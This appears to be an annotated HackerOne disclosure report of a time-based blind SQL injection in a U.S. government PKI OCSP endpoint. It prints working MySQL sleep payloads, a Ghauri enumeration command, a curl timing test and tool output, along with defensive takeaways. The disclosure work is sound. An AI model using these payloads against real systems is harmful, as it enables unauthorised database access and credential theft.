# Time-Based Blind SQL Injection in OCSP Endpoint URI Path - Government PKI Database Disclosure

## Metadata
- **Source:** HackerOne
- **Report:** 3234050 | https://hackerone.com/reports/3234050
- **Submitted:** 2025-07-02
- **Reporter:** 0x0sadat
- **Program:** U.S. Government Public Key Infrastructure (PKI)
- **Bounty:** Not specified
- **Severity:** Critical
- **Vuln:** SQL Injection (Time-Based Blind), Improper Input Validation, Insufficient Access Controls
- **CVEs:** None
- **Category:** uncategorised

## Summary
A time-based blind SQL injection vulnerability exists in the /home/server-ocsp/ endpoint's URI path parameter, allowing unauthenticated attackers to extract complete database metadata and sensitive data from the backend MySQL database. The vulnerability enables full database enumeration including table and column names, user data, and credentials through time-delay based inference attacks.

## Attack scenario
1. Attacker discovers the vulnerable /home/server-ocsp/ endpoint accepts user input in the URI path without proper sanitization
2. Attacker crafts a malicious URI containing SQL injection payload: 'XOR(SELECT(0)FROM(SELECT(SLEEP(6)))a)XOR'Z to introduce time delays
3. Attacker uses automated tools like Ghauri to perform time-based inference attacks, measuring response time differences to determine true/false conditions
4. Attacker systematically extracts database name ('de' identified), table names, column structures, and data contents through repeated queries
5. Attacker enumerates all available databases and tables to identify sensitive information stores (user credentials, PKI configurations)
6. Attacker exfiltrates complete dataset including user accounts, credentials, and system configurations, compromising PKI infrastructure integrity

## Root cause
The application fails to implement parameterized queries or prepared statements for URI path parameters. User-supplied input in the path is directly concatenated into SQL queries without proper escaping, type validation, or input filtering. Additionally, error-based feedback and response time differences allow attackers to infer SQL query results.

## Attacker mindset
An attacker targeting government infrastructure would recognize the high-value nature of PKI database contents. The time-based blind technique works even with minimal error feedback, making this a reliable exploitation method. The unauthenticated nature of the attack and OCSP endpoint prominence make this an attractive initial access vector for further infrastructure compromise.

## Defensive takeaways
- Implement parameterized queries and prepared statements for ALL database interactions, including URI path parameters
- Apply strict input validation and whitelisting for URI parameters before database processing
- Enforce consistent response times regardless of query results to prevent timing-based inference attacks
- Implement rate limiting and WAF rules to detect and block SQL injection patterns and repeated time-delay probes
- Apply principle of least privilege to database service accounts to minimize data exposure even if injection occurs
- Conduct comprehensive code review of all endpoints accepting URI path parameters
- Implement robust logging and monitoring of database queries to detect injection attempts
- Use SQL query analysis tools to identify dynamic query construction vulnerabilities
- Perform regular penetration testing focusing on OWASP Top 10 and government security baselines

## Variant hunting
Check other government PKI endpoints for similar URI path injection vulnerabilities (CRL, certificate validation endpoints)
Test alternative injection techniques in path parameters: error-based, union-based, stacked queries
Fuzz URI parameters with common SQL injection payloads across all public-facing endpoints
Examine similar OCSP implementations in other certificate authorities and government systems
Test for second-order SQL injection where path input is stored and later executed
Check for time-based blind injection in other parameter types: headers, cookies, query strings
Evaluate if database error messages leak information when exceptions are triggered

## MITRE ATT&CK
- T1190
- T1098
- T1552
- T1020

## Notes
This vulnerability affects critical PKI infrastructure used for government security operations. The unauthenticated nature and time-based blind technique make it particularly dangerous as traditional IDS/IPS signatures may miss the attack. The reference to character filtering (>, BETWEEN) suggests some basic WAF is present but improperly implemented, allowing XOR-based bypasses. The compromise of PKI databases could enable supply chain attacks and authentication fraud at scale.

## Full report
<details><summary>Expand</summary>

**Description:**
A time-based blind SQL injection vulnerability was discovered on the U.S. Government Public Key Infrastructure website (█████████). The injection point exists in the URI path of the /home/server-ocsp/ endpoint.

This vulnerability allows an unauthenticated attacker to interact with the backend MySQL database and extract sensitive information such as the current database name, available tables, columns, and potentially all underlying data.

**Vulnerable Endpoint:**
`█████████*`

## Impact

- Attacker can extract all database metadata and data.
 - Sensitive information exposure: user data, credentials, configs.
 - Possible full compromise of backend data integrity.

## System Host(s)
█████████

## Affected Product(s) and Version(s)


## CVE Numbers


## Steps to Reproduce
**Ghauri Command:**
```
ghauri -u "█████*" \
--technique=T --dbms mysql --time-sec=6 --batch --random-agent --dbs
```

**Manual Curl Time-Based Test:**
You can test the delay manually by measuring response time difference using `curl` and `time`:
```time curl -s -o /dev/null "████████'XOR(if(now()=sysdate(),sleep(6),0))XOR'Z/"```


**Proof of Concept Output (From Ghauri):**
```
---
Parameter: #1* (URI)
    Type: time-based blind
    Title: MySQL >= 5.0.12 time-based blind (query SLEEP)
    Payload: ██████████'XOR(SELECT(0)FROM(SELECT(SLEEP(6)))a)XOR'Z
---
[05:02:53] [INFO] testing MySQL
[05:02:53] [INFO] confirming MySQL
[05:02:53] [INFO] the back-end DBMS is MySQL
[05:02:53] [INFO] fetching current database
[05:03:16] [WARNING] ("it appears that the character '>' and 'BETWEEN' operator is filtered by the back-end server. ghauri will based data retrieval on IN() operator",)
[05:04:40] [INFO] retrieved: 'de'
current database: 'de'
```

**POC: Video Added**
██████

## Suggested Mitigation/Remediation Actions




</details>

---
*Analysed by Claude on 2026-05-24*
